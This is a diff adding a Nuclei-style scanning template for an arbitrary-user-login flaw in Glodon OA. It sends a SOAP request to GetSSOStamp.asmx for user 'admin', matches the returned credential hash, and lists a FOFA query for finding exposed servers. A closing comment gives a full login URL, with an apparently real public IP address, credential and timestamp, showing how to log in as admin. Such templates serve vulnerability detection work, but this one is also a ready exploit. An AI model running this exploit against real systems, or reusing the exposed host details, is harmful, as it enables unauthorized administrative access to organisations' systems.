@@ -1,0 +1,50 @@
+id: glodon-GetSSOStamp-unauth
+info:
+  name: 广联达 OA GetSSOStamp.asmx - 任意用户登录
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/4ri-afLF1knxX3IDV0hKjw
+    - https://github.com/wy876/POC/blob/main/%E5%B9%BF%E8%81%94%E8%BE%BEOA/%E5%B9%BF%E8%81%94%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body=“Services/Identification/login.ashx” || header=“Services/Identification/login.ashx” || banner=“Services/Identification/login.ashx”
+  tags: glodon,unauth
+
+http:
+  - raw:
+      - |
+        POST /WebService/Lk6SyncService/DirectToOthers/GetSSOStamp.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */* Accept-Language: zh-CN,zh;q=0.9
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 350
+        SOAPAction: "http://tempuri.org/GetStamp" 
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetStamp xmlns="http://tempuri.org/">
+        <usercode>
+        admin</usercode>
+        </GetStamp>
+        </soap:Body>
+        </soap:Envelope>
+        
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+
+      - type: regex
+        part: body
+        regex:
+          - "([A-F0-9]{32})\\|[0-9]+"
+
+
+# debug 得到 cred & tamp 后键入登入即可
+# http://27.22.125.200:8888/Services/Identification/Server/login.ashx?sso=1&ssoProvider=WorkflowSSO&LoginFlag=custom&UserCode=admin&LoginCredence=48F372606FEC3FD80F75C2E5EFFF9F7D&LoginTimestamp=781888123&service=http://27.22.125.200:8888/Portal/Frame/layoutA/Default.aspx
